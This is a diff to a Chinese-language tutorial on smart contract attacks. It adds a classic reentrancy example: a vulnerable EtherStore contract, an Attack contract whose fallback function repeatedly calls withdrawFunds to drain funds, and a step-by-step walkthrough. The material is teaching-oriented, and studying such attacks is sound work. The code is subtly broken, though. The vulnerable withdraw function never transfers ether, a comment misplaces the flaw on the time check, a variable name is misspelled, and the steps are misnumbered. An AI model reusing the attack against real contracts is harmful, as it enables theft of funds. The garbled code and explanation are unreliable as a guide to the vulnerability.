@@ -1,5 +1,11 @@
 智能合約攻擊手段與防禦措施
 
+防禦性編碼
+
+A. 最小性/ 簡單化
+
+B. 代碼重用
+
 
 攻擊種類
 
@@ -26,6 +32,89 @@ D. 應用程序漏洞
 A. 重入性
 
 重入性被認為是智能合約中最災難性的攻擊技術之一​​。這種攻擊技術能夠完全破壞合約或竊取有價值的信息。當一個函數通過外部調用調用另一個合約時，可能會發生重入性攻擊。下面的清單1展示了一個代碼片段，該代碼片段可以被利用來執行重入性攻擊。這種利用允許攻擊者執行主函數的遞歸回調，形成一個意外的循環，多次重複。例如，當一個容易受攻擊的合約包含一個撤銷函數時，合約可能多次非法調用撤銷函數，以排空合約包含的任何可用餘額。單一函數重入性攻擊和跨函數重入性攻擊是兩種不同的類型，可以被攻擊者利用。這種利用允許攻擊者使用外部調用來執行期望的任務。
+
+讓我們舉個例子，參考以下有漏洞的合約，它可以作為保險箱使用，讓使用者每週提取1乙太幣。
+
+
+    contract EtherStore{
+        uint256 public withdrawalLimit = 1ether;
+        mapping(address => uint256) public lastWithdraTime;
+        mapping(address => uint256) public balances;
+    
+        function depositFunds() public payable{
+            balances[msg.sender] += msg.value;
+        }
+    
+        function withdrawFunds(uint256 _weiToWithdraw) public {
+            require(balances[msg.sender] >= _weiToWithdraw);
+            //limit the withdrawal
+            require(_weiToWithdraw <= withdrawalLimit);
+            //下面這一行有漏洞，請試著思考哪裡不合理
+            require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
+            balances[msg.sender] -= _weiToWithdraw;
+            lastWithdrawTime[msg.sender] = now;
+        }
+    
+    }
+
+如果一個攻擊者創建了一個惡意合約如下
+
+    import "EtherStore.sol";
+    
+    contract Attack{
+        EtherStore public etherStore;
+    
+        constructor( address _etherStoreAddress) {
+            etherStore = EtherStore(_etherStoreAddress);
+        }
+    
+        function attackEtherStore() public payable{
+        
+            //attack to the nearest ether
+            require(msg.value >= 1 ether);
+            
+            //send eth to the depositFunds() function
+            etherStore.depositFunds.value(1 ether)();
+    
+            //遊戲開始！
+            etherStore.withdrawFunds(1 ether);
+        
+        }
+    
+        function collectEther() public{
+            msg.sender.transfer(this.balance);
+        }
+    
+        //fallback function - 魔術發生的地方
+        function() payable{
+            if(etherStore.balance > 1 ether){
+                etherStore.withdrawFunds(1 ether);
+            }
+        
+        }
+    
+    }
+
+讓我們一步一步來看：
+1. 攻擊者首先部署EtherStore合約。
+然後，攻擊者部署Attack合約，並在構造函數中指定EtherStore合約的地址。這樣，Attack合約就可以與EtherStore合約進行交互。
+
+2.攻擊者通過調用Attack合約的attackEtherStore()函數來啟動攻擊。這個函數首先要求攻擊者發送至少1個以太幣到Attack合約。
+attackEtherStore()函數接著調用EtherStore合約的depositFunds()方法，將這1個以太幣存入EtherStore合約。
+緊接著，attackEtherStore()函數調用EtherStore的withdrawFunds()方法，嘗試從EtherStore合約提取1個以太幣。
+
+3. 當EtherStore合約處理提款請求時，它將1個以太幣發送回Attack合約。
+由於是以太幣的轉移，這自動觸發了Attack合約的回調函數（fallback函數）。
+
+5. 回調函數中的重入攻擊：
+在Attack合約的回調函數中，如果檢測到EtherStore合約的餘額仍然大於1個以太幣，它會再次調用EtherStore合約的withdrawFunds()方法。
+重點是，在EtherStore合約更新用戶的餘額和最後提款時間之前，就發送了以太幣。這意味著Attack合約可以在同一個交易中多次提取資金。
+
+5.每次Attack合約的回調函數被觸發時，它都會檢查EtherStore的餘額，並再次嘗試提款。
+這個循環會持續進行，直到EtherStore的餘額降至不足以繼續提款為止。
+
+6. 一旦EtherStore的餘額不足以繼續提款，Attack合約的回調函數停止執行。
+攻擊者可以通過調用Attack合約的collectEther()函數，將從EtherStore合約中提取的所有資金轉移到自己的賬戶。
 
 B. 溢出
 這種漏洞相對容易引發，並且發生在接受未經授權的輸入數據或值的交易中​​。智能合約溢出主要發生在提供的值超過最大值時​​。這些合約主要用Solidity編寫，Solidity可以處理高達256位的數字，因此增加1將導致溢出。傳統的測試方法不足以確定智能合約中的溢出漏洞。
